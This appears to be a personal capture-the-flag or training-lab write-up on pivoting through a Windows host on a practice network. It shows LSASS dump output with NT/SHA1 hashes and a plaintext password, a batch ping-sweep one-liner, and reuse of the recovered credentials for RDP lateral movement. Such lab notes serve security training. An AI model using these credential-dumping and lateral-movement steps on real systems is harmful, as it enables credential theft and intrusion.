Windows
IP - 172.16.5.35

Users at C:\Users folder

![[Pasted image 20230823112309.png]]

Dumping LSASS service we found useful info

```plain/text
== MSV ==
	Username: PIVOT-SRV01$
	Domain: INLANEFREIGHT
	LM: NA
	NT: 21ce18b1a025d4b0b01c0e716e99d476
	SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
	DPAPI: NA
== MSV ==
	Username: mlefay
	Domain: PIVOT-SRV01
	LM: NA
	NT: 2831bf1e4e0841d882328d5481fb5c92
	SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
	DPAPI: NA
== Kerberos ==
	Username: vfrank
	Domain: INLANEFREIGHT.LOCAL
	Password: Imply wet Unmasked!
	password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
```

We would try to crack the hashes but we have a plain text password for vfrank so we got credentials vfrank:'Imply wet Unmasked!'

Lets discover other machines

![[Pasted image 20230823115128.png]]

Making a ping sweep for the 172.16.6.0/254 network and we found two IPs

```bash
FOR /L %i IN (1,1,254) DO ping -n 1 172.16.6.%i | FIND /i "Reply">>C:\ipaddresses.txt

Reply from 172.16.6.25: bytes=32 time=1ms TTL=128
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
```

Now connect through RDP using mstsc.exe, IP 172.16.6.25 and credentials vfrank:'Imply wet Unmasked!'